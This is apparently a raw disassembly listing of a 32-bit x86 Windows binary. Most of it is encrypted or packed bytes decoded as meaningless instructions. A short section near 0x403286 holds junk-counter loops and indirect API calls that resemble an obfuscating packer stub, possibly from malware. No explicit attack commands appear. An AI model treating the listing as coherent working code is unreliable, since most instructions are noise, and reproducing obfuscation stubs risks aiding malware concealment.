  403092:	adc    BYTE PTR [ebx],ah
  403094:	pushf  
  403095:	test   BYTE PTR [edx-0x3e3dc61f],bl
  40309b:	loop   0x4030a6
  40309d:	pop    esp
  40309e:	mov    ebp,0x907dcbd
  4030a3:	sahf   
  4030a4:	sub    DWORD PTR ds:[edx+0x2c],esp
  4030a8:	push   esp
  4030a9:	xchg   ebx,eax
  4030aa:	dec    edi
  4030ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030ac:	aad    0xc5
  4030ae:	dec    ebp
  4030af:	enter  0x3b57,0x3c
  4030b3:	adc    BYTE PTR ss:[esi+0x1e],dh
  4030b7:	mov    DWORD PTR [edi],edx
  4030b9:	dec    ecx
  4030ba:	xor    bl,dl
  4030bc:	push   ebp
  4030bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030be:	fidivr WORD PTR [edi+0x1af6edcf]
  4030c4:	pop    ss
  4030c5:	loope  0x4030c3
  4030c7:	pushf  
  4030c8:	adc    al,0x37
  4030ca:	bound  esi,QWORD PTR [ebp+edx*4+0x23]
  4030ce:	mov    edi,ss
  4030d0:	shr    BYTE PTR ds:0x94df0fd7,cl
  4030d6:	sbb    al,0xe0
  4030d8:	or     edi,DWORD PTR [eax+0x5108aaf3]
  4030de:	and    al,0x6d
  4030e0:	sub    BYTE PTR [ebp+ecx*1-0x387e4a15],bl
  4030e7:	sub    DWORD PTR [esi+0x1182591f],ecx
  4030ed:	mov    eax,ds:0x7c6db54e
  4030f2:	cmp    dh,0x50
  4030f5:	in     eax,dx
  4030f6:	push   esp
  4030f7:	(bad)
  4030fa:	inc    esp
  4030fb:	addr16 mov esi,0xdf97df16
  403101:	add    eax,0xc7d73080
  403106:	cdq    
  403107:	sub    DWORD PTR ss:[eax-0x1b93653a],edi
  40310e:	das    
  40310f:	jg     0x4030fb
  403111:	mov    ds:0x41517812,al
  403116:	mov    edi,cs
  403118:	hlt    
  403119:	fsub   st(0),st
  40311b:	and    al,0xd4
  40311d:	inc    cl
  40311f:	pop    esp
  403120:	mov    ds:0x139b65b7,al
  403125:	jle    0x403183
  403127:	fs push ebp
  403129:	mov    eax,esi
  40312b:	leave  
  40312c:	ss xchg esp,eax
  40312e:	aad    0x92
  403130:	xchg   edi,eax
  403131:	push   cs
  403132:	nop
  403133:	into   
  403134:	aas    
  403135:	xchg   esp,eax
  403136:	es pop es
  403138:	arpl   WORD PTR ds:0x120b8d0a,bx
  40313e:	xchg   ebx,eax
  40313f:	shl    bh,cl
  403141:	test   bl,bh
  403143:	fadd   DWORD PTR [ebx]
  403145:	stc    
  403146:	stos   BYTE PTR es:[edi],al
  403147:	int3   
  403148:	add    DWORD PTR ss:[ecx+0x54],edi
  40314c:	lods   eax,DWORD PTR ds:[esi]
  40314d:	mov    al,0xab
  40314f:	mov    edi,ecx
  403151:	cmp    eax,0x4e6974fa
  403156:	imul   esp,DWORD PTR [esi],0xffffff9c
  403159:	mov    edi,0x411e57d4
  40315e:	rcl    DWORD PTR [esi],0x1e
  403161:	dec    ecx
  403162:	pop    ebp
  403163:	xchg   edx,eax
  403164:	pop    es
  403165:	xor    ecx,ebp
  403167:	(bad)  
  403168:	fs scas eax,DWORD PTR es:[edi]
  40316a:	jb     0x4031a2
  40316c:	cmp    DWORD PTR [ebx+0x5f8dd585],edx
  403172:	inc    edx
  403173:	adc    DWORD PTR [edi-0x6d],ebp
  403176:	push   ss
  403177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403178:	call   0x36c7a7c5
  40317d:	xchg   esi,eax
  40317e:	add    edx,DWORD PTR [ebx-0xb]
  403181:	xor    edi,DWORD PTR [ecx+0x5d125b20]
  403187:	add    ebp,DWORD PTR ds:0xe3d822ba
  40318d:	shl    edi,1
  40318f:	into   
  403190:	ss push esi
  403192:	pushf  
  403193:	fstp   TBYTE PTR [edx]
  403195:	dec    ebp
  403196:	cmc    
  403197:	and    esp,esi
  403199:	scas   eax,DWORD PTR es:[edi]
  40319a:	std    
  40319b:	adc    BYTE PTR [ecx-0x12],0x66
  40319f:	inc    ebx
  4031a0:	jp     0x403212
  4031a2:	hlt    
  4031a3:	cs enter 0x2fad,0x67
  4031a8:	jbe    0x403175
  4031aa:	inc    edi
  4031ab:	pop    ecx
  4031ac:	(bad)  
  4031ad:	xor    al,0x8d
  4031af:	fst    QWORD PTR [esi-0x3b]
  4031b2:	and    bh,bl
  4031b4:	pop    DWORD PTR [eax+0x5e]
  4031b7:	push   es
  4031b8:	sub    BYTE PTR [eax+0x3e],dl
  4031bb:	cmp    ebx,DWORD PTR [eax+0x23b7aafe]
  4031c1:	xor    edi,DWORD PTR [esp+ebp*4-0x8]
  4031c5:	ja     0x4031fa
  4031c7:	popa   
  4031c8:	aam    0xd5
  4031ca:	jecxz  0x4031a2
  4031cc:	dec    edx
  4031cd:	cmp    eax,0xa03caaa3
  4031d2:	jo     0x403155
  4031d4:	pop    edi
  4031d5:	pop    edi
  4031d6:	adc    ebx,ecx
  4031d8:	cmp    BYTE PTR [edi],cl
  4031da:	ret    
  4031db:	cwde   
  4031dc:	mov    bl,0xd5
  4031de:	int    0x91
  4031e0:	cmp    al,0xbf
  4031e2:	sub    eax,0xb19641f5
  4031e7:	jns    0x4031a7
  4031e9:	jl     0x4031d2
  4031eb:	mov    eax,ds:0x85925e3d
  4031f0:	aad    0xe4
  4031f2:	in     eax,0x20
  4031f4:	addr16 aad 0x55
  4031f7:	cld    
  4031f8:	sbb    DWORD PTR [eax-0x3],esp
  4031fb:	imul   ecx,eax,0x3e
  4031fe:	sbb    dh,ch
  403200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403201:	add    esi,DWORD PTR [edi+0x594ebbc2]
  403207:	jnp    0x403217
  403209:	xor    dh,0xf2
  40320c:	mov    WORD PTR [ecx-0x34916af5],ds
  403212:	mov    cl,0xfc
  403214:	aas    
  403215:	js     0x403253
  403217:	adc    DWORD PTR [ebx+0x75],ebp
  40321a:	cmp    al,BYTE PTR [ebx]
  40321c:	lods   al,BYTE PTR ds:[esi]
  40321d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40321e:	rcr    DWORD PTR [ecx+0x7],1
  403221:	das    
  403222:	loop   0x4031c8
  403224:	mov    ds:0xd1cf7aaa,al
  403229:	push   eax
  40322a:	int    0xc1
  40322c:	(bad)  
  40322d:	fwait
  40322e:	sti    
  40322f:	sbb    bh,BYTE PTR ds:0x9c5bb888
  403235:	scas   al,BYTE PTR es:[edi]
  403236:	mov    dl,0x5e
  403238:	jbe    0x403225
  40323a:	jg     0x403270
  40323c:	mov    edx,0xc6daa211
  403241:	into   
  403242:	cmp    esp,DWORD PTR [edi]
  403244:	ret    
  403245:	out    0x85,eax
  403247:	sar    eax,0xd6
  40324a:	mov    esp,0xb0ec5dc3
  40324f:	int3   
  403250:	ds out dx,al
  403252:	(bad)  
  403253:	pop    es
  403254:	adc    eax,0x9be07bac
  403259:	ficomp WORD PTR [edi-0x2b]
  40325c:	sub    DWORD PTR [edx+0x2d3eea9f],ecx
  403262:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403263:	pop    edi
  403264:	fsubrp st(0),st
  403266:	xor    BYTE PTR [esi+edx*4+0x52],dl
  40326a:	pop    ebp
  40326b:	pop    ecx
  40326c:	test   ebx,esi
  40326e:	cwde   
  40326f:	and    BYTE PTR [bx+di+0x602],dl
  403274:	mov    edx,esp
  403276:	mov    esi,0x2a09813
  40327b:	fbld   TBYTE PTR [edi-0x7eb05538]
  403281:	pop    ebx
  403282:	leave  
  403283:	ret    0xc
  403286:	push   ebp
  403287:	mov    ebp,esp
  403289:	sub    esp,0x14
  40328c:	leave  
  40328d:	ret    0x4
  403290:	push   ebp
  403291:	mov    ebp,esp
  403293:	push   ecx
  403294:	push   ecx
  403295:	neg    ecx
  403297:	mov    eax,0xf89c8535
  40329c:	and    DWORD PTR ds:0x433617,0x0
  4032a6:	mov    edx,DWORD PTR ds:0x433617
  4032ac:	inc    edx
  4032ad:	mov    DWORD PTR ds:0x433617,edx
  4032b3:	cmp    DWORD PTR ds:0x433617,0x6
  4032ba:	jne    0x4032d5
  4032c0:	push   0x8ffb
  4032c5:	push   0x6662
  4032ca:	push   0x4336ed
  4032cf:	call   DWORD PTR ds:0x412180
  4032d5:	cmp    DWORD PTR ds:0x433617,0x5
  4032dc:	jne    0x4032ef
  4032e2:	mov    edx,DWORD PTR ds:0x433617
  4032e8:	inc    edx
  4032e9:	mov    DWORD PTR ds:0x433617,edx
  4032ef:	cmp    DWORD PTR ds:0x433617,0x11
  4032f6:	jb     0x4032a6
  4032fc:	mov    DWORD PTR [ebp-0x8],eax
  4032ff:	sbb    DWORD PTR ds:0x43359b,edi
  403305:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40330c:	mov    DWORD PTR ds:0x43365b,0x7030
  403316:	mov    edx,DWORD PTR [ebp-0x8]
  403319:	and    DWORD PTR ds:0x4335f3,0x0
  403323:	xor    ecx,ecx
  403325:	or     ecx,DWORD PTR ds:0x4335f3
  40332b:	inc    ecx
  40332c:	mov    DWORD PTR ds:0x4335f3,ecx
  403332:	cmp    DWORD PTR ds:0x4335f3,0x1f
  403339:	jne    0x403361
  40333f:	push   0x433657
  403344:	push   0x433623
  403349:	push   DWORD PTR [ebp-0xc]
  40334c:	push   0x4337cc
  403351:	push   0x4336ca
  403356:	push   0x433767
  40335b:	call   DWORD PTR ds:0x412184
  403361:	cmp    DWORD PTR ds:0x4335f3,0x13
  403368:	jb     0x403323
  40336e:	mov    DWORD PTR ds:0x43355b,0x1f
  403378:	cmp    DWORD PTR ds:0x43355b,0x0
  40337f:	je     0x4033d1
  403385:	cmp    DWORD PTR ds:0x43355b,0x4
  40338c:	jne    0x40339d
  403392:	push   0x4335eb
  403397:	call   DWORD PTR ds:0x412188
  40339d:	cmp    DWORD PTR ds:0x43355b,0x5
  4033a4:	jne    0x4033b9
  4033aa:	xor    ecx,ecx
  4033ac:	xor    ecx,DWORD PTR ds:0x43355b
  4033b2:	dec    ecx
  4033b3:	mov    DWORD PTR ds:0x43355b,ecx
  4033b9:	mov    ecx,DWORD PTR ds:0x43355b
  4033bf:	dec    ecx
  4033c0:	mov    DWORD PTR ds:0x43355b,ecx
  4033c6:	jmp    0x403378
  4033cb:	and    DWORD PTR ds:0x4335e3,ecx
  4033d1:	push   esi
  4033d2:	mov    ecx,0x7510853
  4033d7:	xor    edx,ecx
  4033d9:	mov    esi,0x32729a
  4033de:	adc    DWORD PTR ds:0x43362b,0x4fea
  4033e8:	push   edi
  4033e9:	sub    DWORD PTR ds:0x4335db,0x417a
  4033f3:	mov    edi,DWORD PTR [ebp+0x10]
  4033f6:	add    edx,esi
  4033f8:	cmp    edi,edx
  4033fa:	je     0x403eaf
  403400:	jmp    0x40360c
  403405:	adc    DWORD PTR [edi+0x6fb6ef04],esp
  40340b:	icebp  
  40340c:	popa   
  40340d:	mov    WORD PTR [ebx],?
  40340f:	push   edi
  403410:	inc    esp
  403411:	xchg   DWORD PTR [ebp+0x1316d8a5],edi
  403417:	jl     0x403495
  403419:	ins    DWORD PTR es:[edi],dx
  40341a:	jg     0x403498
  40341c:	jl     0x40340e
  40341e:	and    edi,DWORD PTR [ebx+0x48]
  403421:	les    edx,FWORD PTR [ebx]
  403423:	div    BYTE PTR [esi]
  403425:	sub    al,0x6e
  403427:	push   0xc242eacd
  40342c:	addr16 cld 
  40342e:	fidivr DWORD PTR [ecx]
  403430:	bound  eax,QWORD PTR [edx]
  403432:	cmp    ebp,ecx
  403434:	dec    eax
  403435:	xor    bh,BYTE PTR fs:[ebp+0x53]
  403439:	pop    esi
  40343a:	inc    eax
  40343b:	xlat   BYTE PTR ds:[ebx]
  40343c:	loope  0x40348e
  40343e:	jp     0x40348c
  403440:	nop
  403441:	dec    ecx
  403442:	out    dx,eax
  403443:	mov    dh,al
  403445:	dec    eax
  403446:	add    ch,bl
  403448:	jp     0x4034b2
  40344a:	imul   eax
  40344c:	xor    DWORD PTR [ebx-0x12],edi
  40344f:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  403451:	mov    ecx,esi
  403453:	mov    dh,0x10
  403455:	adc    eax,DWORD PTR [edi+ecx*2+0x551f12d2]
  40345c:	adc    DWORD PTR [edi+0x78dd1d7f],0x13
  403463:	mov    cl,0xc7
  403465:	mov    edx,0x542fef
  40346a:	dec    eax
  40346b:	scas   al,BYTE PTR es:[edi]
  40346c:	test   eax,0x4b170e34
  403471:	cwde   
  403472:	lock pop edx
  403474:	xor    eax,0x687aa4ae
  403479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40347a:	jae    0x4034b5
  40347c:	inc    edi
  40347d:	mov    ds,WORD PTR [ebx]
  40347f:	(bad)  
  403480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403481:	shl    DWORD PTR [ebp-0x72],0xa1
  403485:	push   esp
  403486:	cmp    BYTE PTR [ebp+0x40cd91d1],0x25
  40348d:	jmp    0xd5e1fd41
  403492:	imul   ebp,DWORD PTR [edx+ebx*2],0xe8180b19
  403499:	mov    al,0x44
  40349b:	push   cs
  40349c:	push   0x1f
  40349e:	add    BYTE PTR [edi],dl
  4034a0:	and    ecx,DWORD PTR [edi]
  4034a2:	js     0x4034c1
  4034a4:	push   esi
  4034a5:	and    BYTE PTR [ecx+0x31],cl
  4034a8:	nop
  4034a9:	stc    
  4034aa:	push   cs
  4034ab:	and    eax,0x36638b4f
  4034b0:	cmc    
  4034b1:	push   edx
  4034b2:	pop    esp
  4034b3:	cdq    
  4034b4:	mov    bl,0x56
  4034b6:	ins    BYTE PTR es:[edi],dx
  4034b7:	push   es
  4034b8:	aas    
  4034b9:	sub    eax,0x57dff5bd
  4034be:	lods   al,BYTE PTR ds:[esi]
  4034bf:	mov    ecx,0xaaf0223d
  4034c4:	out    0x54,al
  4034c6:	push   eax
  4034c7:	lea    esi,[esi-0x30]
  4034ca:	and    eax,0x4a5f477f
  4034cf:	mov    ds:0x9bf28c85,eax
  4034d4:	icebp  
  4034d5:	add    DWORD PTR [ebx],0xffffffdf
  4034d8:	call   0xc4010806
  4034dd:	enter  0xca5b,0xf7
  4034e1:	loopne 0x403489
  4034e3:	mov    ecx,0x1d1cf8f3
  4034e8:	int3   
  4034e9:	xchg   ebx,eax
  4034ea:	mov    ebp,0xa2f2b018
  4034ef:	test   eax,0x1d6714fa
  4034f4:	xchg   edx,eax
  4034f5:	sar    DWORD PTR [edi-0x7],1
  4034f8:	xor    ebx,DWORD PTR [esi-0x3d]
  4034fb:	mov    eax,ds:0xa423ccc8
  403500:	adc    edx,DWORD PTR [edx+0x6439a519]
  403506:	jno    0x4034bb
  403508:	lods   al,BYTE PTR ds:[esi]
  403509:	xchg   ebp,eax
  40350a:	mov    ebp,0xe63915b5
  40350f:	jb     0x403530
  403511:	cmp    cl,BYTE PTR [esp+ebp*8]
  403514:	xchg   BYTE PTR [edx+0x49],al
  403517:	push   ebx
  403518:	push   ecx
  403519:	int3   
  40351a:	in     eax,dx
  40351b:	and    DWORD PTR [ebx],esi
  40351d:	xor    ah,BYTE PTR [edi-0x7f]
  403520:	inc    edx
  403521:	stc    
  403522:	mov    esp,0x19b84700
  403527:	mov    dl,0x7a
  403529:	mov    cl,0x8b
  40352b:	retf   0x182b
  40352e:	hlt    
  40352f:	jne    0x403535
  403531:	cmp    eax,0xf2ffe0f
  403536:	cmp    DWORD PTR [edx],ebp
  403538:	or     BYTE PTR [ebx-0x25],ch
  40353b:	adc    ebp,DWORD PTR [edi-0x4cee253b]
  403541:	fadd   QWORD PTR [ecx+ebp*8+0x1f3763ec]
  403548:	sti    
  403549:	pop    ds
  40354a:	leave  
  40354b:	push   ebp
  40354c:	cmc    
  40354d:	mov    ebx,0xc997ff4e
  403552:	jo     0x40355e
  403554:	into   
  403555:	mov    ebp,esi
  403557:	pop    ss
  403558:	mov    ch,0x6d
  40355a:	jae    0x4035bd
  40355c:	(bad)  
  40355d:	loop   0x403549
  40355f:	test   DWORD PTR [esi-0x498f5641],edi
  403565:	pop    edi
  403566:	enter  0x19da,0x12
  40356a:	(bad)  
  40356b:	pop    esp
  40356c:	or     esi,DWORD PTR [ecx]
  40356e:	inc    eax
  40356f:	ret    
  403570:	jmp    0x633c3fb
  403575:	or     ebx,DWORD PTR [ebp+0x23]
  403578:	adc    BYTE PTR [edx+0x5361be4c],ah
  40357e:	adc    bh,BYTE PTR [ecx-0x4e]
  403581:	sub    esi,ebx
  403583:	xchg   ecx,eax
  403584:	sub    edi,DWORD PTR [edx+ecx*4]
  403587:	jmp    0x5090:0x2f3a9b3f
  40358e:	ror    DWORD PTR [ecx-0x5],0xec
  403592:	nop
  403593:	in     al,dx
  403594:	fwait
  403595:	dec    eax
  403596:	and    ecx,DWORD PTR [ecx+0x4de1e338]
  40359c:	pusha  
  40359d:	fst    DWORD PTR [ebx+0x2]
  4035a0:	icebp  
  4035a1:	xchg   ebp,eax
  4035a2:	mov    edi,0x5b840af6
  4035a7:	mov    edx,DWORD PTR [esi+0x173f9523]
  4035ad:	pop    ecx
  4035ae:	shl    ebx,cl
  4035b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035b1:	lods   al,BYTE PTR ds:[esi]
  4035b2:	add    bh,BYTE PTR es:[edx-0x4803c72e]
  4035b9:	xchg   esp,eax
  4035ba:	call   0x11548902
  4035bf:	mov    BYTE PTR [edx+0xbdd4997],ch
  4035c5:	mov    ds:0xc3b85c3f,eax
  4035ca:	or     BYTE PTR [esi+0x10ff1e8c],dh
  4035d0:	inc    eax
  4035d1:	push   ecx
  4035d2:	aaa    
  4035d3:	sbb    BYTE PTR ds:0x41fa7283,al
  4035d9:	sub    ebx,DWORD PTR [edi+0x4a460a62]
  4035df:	cmp    eax,0x793755c2
  4035e4:	mov    esp,0x12808dd0
  4035e9:	aam    0xf8
  4035eb:	daa    
  4035ec:	loop   0x4035be
  4035ee:	or     eax,0xabaeeefb
  4035f3:	pusha  
  4035f4:	xor    DWORD PTR ds:0x9dcfa1d,eax
  4035fa:	inc    eax
  4035fb:	cdq    
  4035fc:	mov    bh,0xfa
  4035fe:	pop    esp
  4035ff:	leave  
  403600:	fnstcw WORD PTR [edi-0x4bae3f8f]
  403606:	add    BYTE PTR [esi+ebp*8-0x744f186a],dh
  40360d:	push   ebp
  40360e:	clc    
  40360f:	mov    eax,DWORD PTR [ebp-0x4]
  403612:	xor    eax,ecx
  403614:	mov    edi,0xffcd8d66
  403619:	sub    edi,eax
  40361b:	add    edi,DWORD PTR [ebp+0x10]
  40361e:	xor    edx,ecx
  403620:	add    edx,esi
  403622:	cmp    edx,edi
  403624:	ja     0x403eaa
  40362a:	push   ebx
  40362b:	jmp    0x403841
  403630:	mov    esi,0x32729a
  403635:	jmp    0x403841
  40363a:	sbb    dh,BYTE PTR [eax+ebx*8+0x727272b6]
  403641:	mov    al,0x9c
  403643:	outs   dx,DWORD PTR ds:[esi]
  403644:	call   0x6c053f76
  403649:	sub    eax,0x7c7c1d07
  40364e:	ins    DWORD PTR es:[edi],dx
  40364f:	jg     0x4036cd
  403651:	jl     0x4035f4
  403653:	(bad)  
  403654:	adc    DWORD PTR [edi-0x787726c9],ebx
  40365a:	(bad)  
  40365b:	jne    0x4036db
  40365d:	push   ebx
  40365e:	pushf  
  40365f:	cmp    esi,DWORD PTR [esi+ebx*1]
  403662:	sub    esi,DWORD PTR [edi+edi*8+0x35]
  403666:	icebp  
  403667:	adc    ebp,edi
  403669:	push   edx
  40366a:	or     DWORD PTR gs:[ebx+0x264cf0a1],eax
  403671:	aaa    
  403672:	lds    eax,FWORD PTR ds:0xd9fd4610
  403678:	mov    dh,0x45
  40367a:	mov    al,0xbb
  40367c:	push   ebx
  40367d:	sbb    al,0xa4
  40367f:	dec    esi
  403680:	out    dx,al
  403681:	shr    DWORD PTR [esi],1
  403683:	push   cs
  403684:	repz push ss
  403686:	sub    ah,dl
  403688:	and    al,0xe3
  40368a:	xor    eax,0x649d40a5
  40368f:	or     dh,BYTE PTR [edx-0x3fbda0ef]
  403695:	std    
  403696:	outs   dx,BYTE PTR ds:[esi]
  403697:	dec    edi
  403698:	push   edi
  403699:	ror    BYTE PTR ds:0xfdc72177,1
  40369f:	les    ebx,FWORD PTR [ebx-0x71b75e13]
  4036a5:	xor    esp,esi
  4036a7:	aad    0xf6
  4036a9:	leave  
  4036aa:	push   0x7c
  4036ac:	neg    BYTE PTR [edx+0x2b5359a8]
  4036b2:	sbb    BYTE PTR [ebp*4-0x53cbc961],ch
  4036b9:	imul   esp,DWORD PTR [ebx+0x50],0x57
  4036bd:	in     eax,dx
  4036be:	data16 fs cli 
  4036c1:	pushf  
  4036c2:	addr16 nop
  4036c4:	out    dx,eax
  4036c5:	dec    ecx
  4036c6:	push   ebp
  4036c7:	and    BYTE PTR [ebx],cl
  4036c9:	and    DWORD PTR [edx+edi*8],0x55
  4036cd:	mov    al,ds:0xde754f1
  4036d2:	push   ss
  4036d3:	push   edx
  4036d4:	scas   eax,DWORD PTR es:[edi]
  4036d5:	loop   0x4036b3
  4036d7:	and    DWORD PTR [esi],ebx
  4036d9:	sub    DWORD PTR [esi],eax
  4036db:	cli    
  4036dc:	aad    0xab
  4036de:	shl    BYTE PTR [esi],1
  4036e0:	outs   dx,BYTE PTR ds:[esi]
  4036e1:	or     DWORD PTR [ebx],eax
  4036e3:	xor    ecx,ebx
  4036e5:	xlat   BYTE PTR ds:[ebx]
  4036e6:	mov    esp,0xca71de02
  4036eb:	mov    fs,WORD PTR [eax]
  4036ed:	mov    ch,0xd8
  4036ef:	dec    esp
  4036f0:	sar    BYTE PTR [edx+0x4f],cl
  4036f3:	faddp  st(0),st
  4036f5:	mov    esi,0x1051e580
  4036fa:	repz pop edx
  4036fc:	(bad)
  4036ff:	popf   
  403700:	mov    ds:0xfea53ee8,eax
  403705:	sub    ah,0xf0
  403708:	dec    edx
  403709:	xchg   edx,eax
  40370a:	mov    esi,0xb25c11f6
  40370f:	stc    
  403710:	or     ch,BYTE PTR [ebp-0x2d]
  403713:	push   ds
  403714:	cli    
  403715:	fwait
  403716:	push   esp
  403717:	add    edi,DWORD PTR [ecx+ebx*1-0x5c1e12f1]
  40371e:	pop    ebp
  40371f:	jae    0x403727
  403721:	iret   
  403722:	retf   0xb357
  403725:	sbb    ah,BYTE PTR [ebx]
  403727:	mov    al,bl
  403729:	(bad)  
  40372a:	and    al,0xc4
  40372c:	cmp    eax,0x8659ab21
  403731:	popf   
  403732:	push   ecx
  403733:	add    BYTE PTR [eax+eax*8-0x50],0xb9
  403738:	pop    ss
  403739:	aad    0x76
  40373b:	stos   DWORD PTR es:[edi],eax
  40373c:	add    DWORD PTR [edx-0x4051a02a],ebp
  403742:	fisubr WORD PTR [ebp-0x4e4f66f4]
  403748:	add    BYTE PTR [edi-0x1a95dc94],bh
  40374e:	(bad)  
  40374f:	shl    DWORD PTR [edx],1
  403751:	xchg   ebp,eax
  403752:	inc    edx
  403753:	and    DWORD PTR [edx],ebx
  403755:	jecxz  0x40379d
  403757:	cmp    eax,0x3f907df7
  40375c:	gs jmp 0x1fc5:0x7c4addd2
  403764:	xor    BYTE PTR [edx-0x5a7b7bc7],cl
  40376a:	xor    ebp,ebx
  40376c:	xchg   ebx,eax
  40376d:	dec    ecx
  40376e:	cmc    
  40376f:	gs fcmove st,st(4)
  403772:	or     BYTE PTR [ebx+edx*8],dl
  403775:	sbb    esp,DWORD PTR [esi+0x7338e5c]
  40377b:	adc    eax,0x1fd236e8
  403780:	inc    ebx
  403781:	mov    ah,0xe0
  403783:	(bad)  
  403784:	retf   
  403785:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403786:	neg    BYTE PTR [edi]
  403788:	mov    ds:0xe5c520ed,al
  40378d:	dec    ebp
  40378e:	out    0xea,al
  403790:	(bad)  
  403791:	fist   DWORD PTR [ebp+0x2e767d99]
  403797:	dec    esp
  403798:	pop    edx
  403799:	push   cs
  40379a:	dec    edi
  40379b:	mov    ds:0xa22e25a4,eax
  4037a0:	ret    0xeae
  4037a3:	cdq    
  4037a4:	pop    edi
  4037a5:	cli    
  4037a6:	clc    
  4037a7:	dec    ebx
  4037a8:	dec    edi
  4037a9:	scas   eax,DWORD PTR es:[edi]
  4037aa:	test   al,0xff
  4037ac:	sub    dh,dh
  4037ae:	add    DWORD PTR [edx+0x68],esi
  4037b1:	test   eax,0xb4a40efe
  4037b6:	mov    edx,DWORD PTR [esi]
  4037b8:	add    dh,dl
  4037ba:	and    esp,DWORD PTR [esi-0x44]
  4037bd:	repz mov ah,0x4d
  4037c0:	cld    
  4037c1:	mov    ds:0x2fd6c611,al
  4037c6:	xor    edi,DWORD PTR [ebx-0x6a418b28]
  4037cc:	push   es
  4037cd:	inc    eax
  4037ce:	jbe    0x4037d3
  4037d0:	repz jp 0x4037bf
  4037d3:	sti    
  4037d4:	hlt    
  4037d5:	pop    ebp
  4037d6:	mov    al,0x48
  4037d8:	mov    ah,0xff
  4037da:	cld    
  4037db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037dc:	mov    dh,0x77
  4037de:	add    BYTE PTR [eax],al
  4037e0:	xchg   esi,eax
  4037e1:	xchg   esp,eax
  4037e2:	inc    ebp
  4037e3:	dec    ebx
  4037e4:	outs   dx,DWORD PTR ds:[esi]
  4037e5:	add    BYTE PTR [eax],0x6b
  4037e8:	call   0x49b6:0xeddeaca0
  4037ef:	jo     0x4037f8
  4037f1:	shl    DWORD PTR [ecx+0xf502516],cl
  4037f7:	das    
  4037f8:	xor    ebx,DWORD PTR [esi-0x7ec50f7f]
  4037fe:	push   cs
  4037ff:	jecxz  0x4037c7
  403801:	sti    
  403802:	jg     0x4037ba
  403804:	(bad)  
  403805:	out    dx,al
  403806:	dec    ecx
  403807:	repz pop es
  403809:	sub    ah,cl
  40380b:	inc    ebp
  40380c:	dec    ebx
  40380d:	pusha  
  40380e:	add    BYTE PTR [edx],bl
  403810:	sbb    DWORD PTR [esi+0x72e51da8],ebx
  403816:	leave  
  403817:	inc    ebx
  403818:	ror    BYTE PTR [eax-0x44],0x48
  40381c:	jp     0x403899
  40381e:	in     al,dx
  40381f:	jnp    0x4037f5
  403821:	push   edx
  403822:	inc    edx
  403823:	mov    ah,0x7c
  403825:	cdq    
  403826:	jo     0x403819
  403828:	sbb    bh,BYTE PTR ds:0xda47eecb
  40382e:	fld    DWORD PTR [ebx+0x29]
  403831:	ret    
  403832:	sbb    al,BYTE PTR [edi+eax*1-0x7751432b]
  403839:	sub    eax,0xd81f9e42
  40383e:	sahf   
  40383f:	sub    esi,DWORD PTR [ebp-0x75]
  403842:	inc    ebp
  403843:	clc    
  403844:	jmp    0x403a50
  403849:	sar    BYTE PTR [esi+0x5d5dd03b],1
  40384f:	sar    DWORD PTR [esi+0x4bfdbe82],cl
  403855:	rcr    BYTE PTR [ebx],1
  403857:	pop    ecx
  403858:	mov    edi,0x7c7c1c74
  40385d:	ins    DWORD PTR es:[edi],dx
  40385e:	jg     0x4038dc
  403860:	jl     0x403844
  403862:	xchg   edi,eax
  403863:	das    
  403864:	fmul   DWORD PTR [edi-0x5d]
  403867:	jp     0x40381a
  403869:	retf   
  40386a:	(bad)
  40386d:	dec    ebp
  40386e:	mov    ebp,0xb6ca3d4a
  403873:	sbb    ch,BYTE PTR [ecx]
  403875:	mov    ebx,0x9cab5fc4
  40387a:	lds    eax,FWORD PTR [ecx+0x31]
  40387d:	push   ss
  40387e:	(bad)  
  40387f:	(bad)  
  403880:	jl     0x403886
  403882:	aad    0x48
  403884:	ss daa 
  403886:	mov    ebp,0x83fac8d7
  40388b:	or     al,BYTE PTR [edi+0x73]
  40388e:	pusha  
  40388f:	mov    ecx,0xf2ac779d
  403894:	inc    edi
  403895:	push   esi
  403896:	xor    al,0x71
  403898:	loop   0x4038e2
  40389a:	inc    ecx
  40389b:	pop    ecx
  40389c:	mov    esp,cs
  40389e:	mov    cl,dl
  4038a0:	in     eax,dx
  4038a1:	xchg   ebp,eax
  4038a2:	bound  ebp,QWORD PTR [ebx-0x5c]
  4038a5:	ins    DWORD PTR es:[edi],dx
  4038a6:	lds    ebp,FWORD PTR [ebp+0x5dd7aca1]
  4038ac:	add    ebx,DWORD PTR [eax]
  4038ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038af:	xchg   BYTE PTR [ebx-0x8],bl
  4038b2:	xchg   edi,eax
  4038b3:	adc    BYTE PTR [ebp-0x1f],bh
  4038b6:	sub    al,0xb0
  4038b8:	mov    esi,0x84089b13
  4038bd:	mov    ds:0xf9f4e606,al
  4038c2:	sub    DWORD PTR [edi],ecx
  4038c4:	loope  0x4038b5
  4038c6:	shr    ecx,cl
  4038c8:	mov    cs,WORD PTR [ebx-0x15]
  4038cb:	mov    bh,0x2e
  4038cd:	add    eax,edi
  4038cf:	adc    BYTE PTR [ebx],ah
  4038d1:	cmc    
  4038d2:	(bad)  
  4038d3:	jmp    0xa81d18e4
  4038d8:	repz push ss
  4038da:	(bad)  
  4038db:	loop   0x4038bd
  4038dd:	mov    eax,0x1a1d6940
  4038e2:	mov    ah,0x17
  4038e4:	mov    eax,0xfc9e0652
  4038e9:	cmc    
  4038ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038eb:	push   ebx
  4038ec:	sti    
  4038ed:	jmp    0x34e1f7c5
  4038f2:	mov    esi,0xdf198c5c
  4038f7:	jg     0x4038f2
  4038f9:	adc    DWORD PTR [ecx+0x7d],esi
  4038fc:	(bad)  
  4038fd:	out    dx,eax
  4038fe:	dec    edi
  4038ff:	lahf   
